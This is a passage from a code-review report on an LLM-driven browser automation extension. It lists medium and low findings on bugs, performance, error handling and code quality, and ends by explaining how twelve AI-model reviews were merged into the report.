**Description:** `startRecording` marks recording as active before async handshake completes. `stopRecording` is a no-op until `session` exists. User starts then immediately stops: stop returns early, then start completes leaving recording active.
**Suggested fix:** Track start-in-flight token; allow stop to cancel pending startup.

---

### [M34] `addDomainPermission` Can Create UI Duplicates
**Severity:** Medium
**Category:** Bug / Code Quality
**Found by:** Codex Quality
**Files:** `src/entrypoints/sidepanel/stores/settings-store.ts:107`, `src/lib/storage.ts:24`
**Description:** Storage de-duplicates, but the store always appends to local state. Re-adding same domain creates duplicates in UI.
**Suggested fix:** Check for duplicates before local `set()` or reload from storage after mutation.

---

### [M35] Raw IndexedDB Instead of Dexie -- Missing Transaction Atomicity
**Severity:** Medium
**Category:** Architecture
**Found by:** Claude Architecture, Codex Architecture
**Files:** `src/lib/db.ts`, `src/lib/db-helpers.ts`
**Description:** Hand-rolled IndexedDB with transaction-per-operation. Capping functions do N+1 transactions. No atomicity for composite operations.
**Suggested fix:** Adopt Dexie or batch operations into single transactions.

---

### [M36] Sequential Single-Transaction IDB Deletes in Cap Functions
**Severity:** Medium
**Category:** Performance
**Found by:** Claude Performance, Codex Performance
**Files:** `src/lib/db-helpers.ts:149-151, 183-186, 219-222`
**Description:** `capScriptVersions`, `capRuns`, `capStateSnapshots` each delete records one-by-one with separate transactions.
**Suggested fix:** Batch deletes into a single transaction.

---

### [M37] `getUsageSummary` Loads All Records Into Memory
**Severity:** Medium
**Category:** Performance
**Found by:** Claude Performance
**Files:** `src/lib/llm-usage.ts:39-87`
**Description:** Uses `index.getAll(range)` loading all records, then iterates for aggregates.
**Suggested fix:** Use cursor-based iteration.

---

### [M38] `refMap` in `a11y-tree.ts` Grows Unboundedly
**Severity:** Medium
**Category:** Performance
**Found by:** Claude Performance, Codex Performance
**Files:** `src/lib/a11y-tree.ts:12-24`
**Description:** WeakRef map and `nextRefId` counter grow monotonically. On SPAs with frequent tree regenerations, stale entries accumulate.
**Suggested fix:** Call `clearRefMap()` at start of each `generateAccessibilityTree()` or periodically prune.

---

### [M39] `getComputedStyle` Called for Every Element in A11y Tree
**Severity:** Medium
**Category:** Performance
**Found by:** Claude Performance
**Files:** `src/lib/a11y-tree.ts:148`
**Description:** Forces style recalculation on every element. On pages with 5000+ elements, this is very expensive.
**Suggested fix:** Use `element.offsetParent === null` as fast visibility check first. Only call `getComputedStyle` for elements passing initial checks.

---

### [M40] QuickJS Pool Exists But Is Unused
**Severity:** Medium
**Category:** Performance / Architecture
**Found by:** Claude Architecture, Claude Performance, Codex Performance
**Files:** `src/lib/quickjs-pool.ts`, `src/lib/quickjs-runner.ts:181`
**Description:** Pool implements module reuse, but runner creates a fresh WASM module on every invocation.
**Suggested fix:** Wire pool into offscreen document execution path.

---

### [M41] Unused `openai` Package in Dependencies
**Severity:** Medium
**Category:** Performance
**Found by:** Claude Performance
**Files:** `package.json:33`
**Description:** `openai` (~1MB) listed as dependency but never imported in source. All LLM calls go through `@mariozechner/pi-ai`.
**Suggested fix:** Remove from dependencies if not a transitive requirement.

---

### [M42] Large Bundle Size -- No Code Splitting / Lazy Loading
**Severity:** Medium
**Category:** Performance
**Found by:** Codex Performance
**Files:** `src/entrypoints/sidepanel/App.tsx`, `wxt.config.ts`
**Description:** Sidepanel eagerly imports all pages/wizard/LLM code. Build produces 2.11 MB sidepanel chunk and 1.89 MB background bundle. No dynamic imports.
**Suggested fix:** Lazy-load `TasksPage`, `SettingsPage`, `CreateTaskWizard`. Split rarely-used background handlers.

---

### [M43] `waitForLoadState` Uses Naive 1s Sleep
**Severity:** Medium
**Category:** Performance
**Found by:** Claude Performance, Codex Performance
**Files:** `src/lib/humanized-page-handler.ts:279-286`
**Description:** Always waits 1 second regardless of actual page load state.
**Suggested fix:** Listen for CDP `Page.loadEventFired` or `Page.frameStoppedLoading` with configurable timeout.

---

### [M44] `waitForSelector` Polling Has No Abort Signal Awareness
**Severity:** Medium
**Category:** Error Handling / Performance
**Found by:** Claude Error, Codex Performance
**Files:** `src/lib/humanized-page-handler.ts:255-276`
**Description:** Polling loop `while (Date.now() - start < timeout)` has no awareness of the execution's `AbortController`. Continues for up to 30s after cancellation.
**Suggested fix:** Check abort signal in polling loop.

---

### [M45] Duplicate Rate-Limit Logic with Magic Number
**Severity:** Medium
**Category:** Code Quality
**Found by:** Claude Quality, Codex Quality
**Files:** `src/lib/db-helpers.ts:247`, `src/lib/notifications.ts:60`
**Description:** `recent.length >= 10` hardcodes limit instead of using `MAX_NOTIFICATIONS_PER_TASK_PER_HOUR`. Rate-limit logic is duplicated.
**Suggested fix:** Import and use the constant. Keep a single rate-limit helper.

---

### [M46] Significant Field Overlap Between Recording Types
**Severity:** Medium
**Category:** Code Quality
**Found by:** Claude Quality
**Files:** `src/types/recording.ts:10-88`
**Description:** `RawRecordingAction`, `RecordingStep`, and `RecordingStepRecord` share 12+ identical fields with copy-pasted definitions. `a11ySubtree` typed differently across them.
**Suggested fix:** Define `BaseRecordingFields` interface and extend.

---

### [M47] Heavy `as any` Usage in CDP Response Handling
**Severity:** Medium
**Category:** Code Quality
**Found by:** Claude Quality, Codex Quality
**Files:** `src/lib/selector-resolver.ts` (8 occurrences), `src/lib/message-router.ts:17,36`, `src/entrypoints/sidepanel/stores/chat-store.ts:106`
**Description:** CDP responses cast to `any`, bypassing type safety at the most error-prone boundaries.
**Suggested fix:** Define CDP response interfaces. Add boundary schemas/types.

---

### [M48] `pi-ai-bridge.ts` is a Cross-Layer Hub
**Severity:** Medium
**Category:** Architecture
**Found by:** Codex Architecture
**Files:** `src/lib/pi-ai-bridge.ts`
**Description:** Combines model resolution, token refresh, credential handling, and usage mapping. Imported by UI stores and backend flows alike.
**Suggested fix:** Split into provider/model selection, credential resolution, and usage accounting modules.

---

### [M49] Content Script Message Types Not Part of Typed Union
**Severity:** Medium
**Category:** Architecture
**Found by:** Claude Architecture
**Files:** `src/entrypoints/content.ts`, `src/lib/messages.ts:80-82`
**Description:** `GET_A11Y_TREE` sent via `chrome.tabs.sendMessage` (background->content) is untyped. Same type name used on two different communication channels.
**Suggested fix:** Define `ContentScriptInboundMessage` union for messages sent TO content scripts.

---

### [M50] Duplicate `initLLM()` Call in Wizard Store
**Severity:** Medium
**Category:** Code Quality
**Found by:** Claude Quality
**Files:** `src/entrypoints/sidepanel/stores/wizard-store.ts:120, 140`
**Description:** `initLLM()` called twice -- once for script generation, once for security review. The second call redundantly re-reads settings and re-resolves the API key.
**Suggested fix:** Reuse `apiKey` from the first call.

---

### [M51] Settings Load Failure Causes Permanent Loading Screen
**Severity:** Medium
**Category:** Error Handling
**Found by:** Codex Error
**Files:** `src/entrypoints/sidepanel/stores/settings-store.ts:43`, `src/entrypoints/sidepanel/pages/SettingsPage.tsx:26`
**Description:** Store sets `error` but `settings` stays `null`, so the page keeps rendering "Loading settings..." forever.
**Suggested fix:** Render error/retry state or seed defaults on failure.

---

## Low Findings

### [L1] `KEYSTROKE_UPDATE` Messages Sent But Never Handled
**Severity:** Low
**Category:** Security / Code Quality
**Found by:** Claude Security, Codex Performance
**Files:** `src/lib/recording/element-selector.ts:163-178`, `src/lib/messages.ts:81`
**Description:** `sendKeystrokeUpdate` sends data to the service worker, but no handler exists. Sensitive-input redaction logic is dead code. Also generates wasted cross-context messages per keystroke.
**Suggested fix:** Add a handler (with sensitive-input handling) or remove the `sendKeystrokeUpdate` calls.

---

### [L2] CSS Selector Injection / Indirect Prompt Injection via DOM Content
**Severity:** Low
**Category:** Security
**Found by:** Claude Security
**Files:** `src/lib/recording/element-selector.ts:100`
**Description:** While `CSS.escape()` prevents direct injection, aria-label values are sent to the LLM for script generation. Malicious pages could craft values for indirect prompt injection.
**Suggested fix:** Truncate aria-label values to ~200 chars. Sanitize before including in LLM prompts.

---

### [L3] `markNotificationRead` Can Drift Unread Count Below Zero
**Severity:** Low
**Category:** Bug
**Found by:** Codex Bug
**Files:** `src/entrypoints/sidepanel/stores/tasks-store.ts:75`
**Description:** Always decrements `unreadCount` even if target notification is already read.
**Suggested fix:** Only decrement when notification transitions from `isRead === 0` to `1`.

---

### [L4] `execution-orchestrator.ts` Finally Block Can Mask Original Error
**Severity:** Low
**Category:** Error Handling
**Found by:** Claude Error
**Files:** `src/lib/execution-orchestrator.ts:169-182`
**Description:** In `finally`, `addScriptRun` / `capRuns` can throw, replacing the original execution error.
**Suggested fix:** Wrap finally block's DB operations in try/catch.

---

### [L5] `tasks-store.ts` `runTask` Fails Silently When No Active Tab
**Severity:** Low
**Category:** Error Handling
**Found by:** Claude Error
**Files:** `src/entrypoints/sidepanel/stores/tasks-store.ts:84-91`
**Description:** If `tab?.id` is undefined, function silently returns with no error feedback.
**Suggested fix:** Set error state: `'No active tab available for execution'`.

---

### [L6] `RecordingStartModal` Error Swallowed Without UI Feedback
**Severity:** Low
**Category:** Error Handling
**Found by:** Claude Error, Codex Error
**Files:** `src/entrypoints/sidepanel/components/RecordingStartModal.tsx:19-31`
**Description:** Catch block resets `starting` but shows no error message.
**Suggested fix:** Add error state to modal and display the message.

---

### [L7] `UsageStats` Swallows Fetch Failure -- Permanent "Loading..."
**Severity:** Low
**Category:** Error Handling
**Found by:** Claude Error, Codex Error
**Files:** `src/entrypoints/sidepanel/components/UsageStats.tsx:9-11`
**Description:** `.catch(() => {})` means component shows "Loading usage..." forever on failure.
**Suggested fix:** Set error state and display "Failed to load" with retry button.

---

### [L8] Dead Code: `observePage`, `classifyFlags`, `UsageStats` Component
**Severity:** Low
**Category:** Code Quality
**Found by:** Claude Quality, Claude Architecture, Codex Quality
**Files:** `src/lib/explorer.ts:58-78`, `src/lib/security/injection-scanner.ts:145`, `src/entrypoints/sidepanel/components/UsageStats.tsx`
**Description:** `observePage()` reimplements wizard-store logic but is never called. `classifyFlags` is exported but never imported. `UsageStats` is not mounted in the app.
**Suggested fix:** Remove dead code or integrate into product.

---

### [L9] Hardcoded `'gpt-5.4'` Default Model in Two Places
**Severity:** Low
**Category:** Code Quality
**Found by:** Claude Quality
**Files:** `src/lib/storage.ts:5`, `src/lib/pi-ai-bridge.ts:104`
**Description:** Default model string duplicated.
**Suggested fix:** Define `DEFAULT_MODEL` constant and reference from both.

---

### [L10] Hardcoded `20` as Default Run Limit
**Severity:** Low
**Category:** Code Quality
**Found by:** Claude Quality
**Files:** `src/entrypoints/sidepanel/stores/tasks-store.ts:50`, `src/entrypoints/background.ts:253`
**Description:** Magic number duplicated.
**Suggested fix:** Add `DEFAULT_RUNS_LIMIT = 20` to constants.

---

### [L11] Welcome Message String Duplicated
**Severity:** Low
**Category:** Code Quality
**Found by:** Claude Quality
**Files:** `src/entrypoints/sidepanel/stores/chat-store.ts:38-39, 166-167`
**Description:** Same welcome string in initial state and `clearChat()`.
**Suggested fix:** Extract to `WELCOME_MESSAGE` constant.

---

### [L12] Duplicate `putNotificationRecord` in `notifications.ts`
**Severity:** Low
**Category:** Code Quality
**Found by:** Claude Quality
**Files:** `src/lib/notifications.ts:78-88`
**Description:** Private function duplicates exported `putNotification` from `db-helpers.ts`.
**Suggested fix:** Import and use the existing one.

---

### [L13] Startup Alarm Sync Recreates All Alarms Even When Unchanged
**Severity:** Low
**Category:** Performance
**Found by:** Codex Performance
**Files:** `src/lib/scheduler.ts:45`, `src/entrypoints/background.ts:160`
**Description:** Clears and recreates all task alarms on every worker wake.
**Suggested fix:** Diff current alarms against desired state.

---

### [L14] Duplicated Pi-AI Context/Text Extraction Helpers
**Severity:** Low
**Category:** Code Quality
**Found by:** Claude Quality, Codex Quality
**Files:** `src/lib/explorer.ts:24`, `src/lib/security/security-review.ts:15`
**Description:** `toContext` / `extractText` helpers duplicated across explorer and security-review.
**Suggested fix:** Extract shared pi-ai adapter module.

---

### [L15] `chrome.sidePanel.setPanelBehavior()` Not Awaited
**Severity:** Low
**Category:** Error Handling
**Found by:** Codex Error
**Files:** `src/entrypoints/background.ts:69`
**Description:** Called without `await`/`catch`. Rejection produces unhandled promise rejection.
**Suggested fix:** Await inside `init()`.

---

## Methodology

This report was compiled from 12 independent reviews:

**Claude reviews (claude-opus-4-6):**
1. Security -- focused on sandbox escapes, postMessage, CDP injection, credential handling, remote mode
2. Code Quality -- focused on DRY, types, anti-patterns, React/Zustand design
3. Bug Detection -- focused on race conditions, state corruption, resource leaks, logic errors
4. Architecture -- focused on module boundaries, DI patterns, coupling, dead features
5. Error Handling -- focused on unhandled errors, missing boundaries, silent failures
6. Performance -- focused on re-renders, IDB patterns, memory leaks, bundle size

**Codex reviews (gpt-5.4):**
7. Security -- same focus as Claude Security
8. Code Quality -- same focus as Claude Code Quality
9. Bug Detection -- same focus as Claude Bug Detection
10. Architecture -- same focus as Claude Architecture
11. Error Handling -- same focus as Claude Error Handling
12. Performance -- same focus as Claude Performance

Findings were deduplicated by matching on affected files, root cause descriptions, and suggested fixes. Where reviewers disagreed on severity, the higher rating was used and noted.
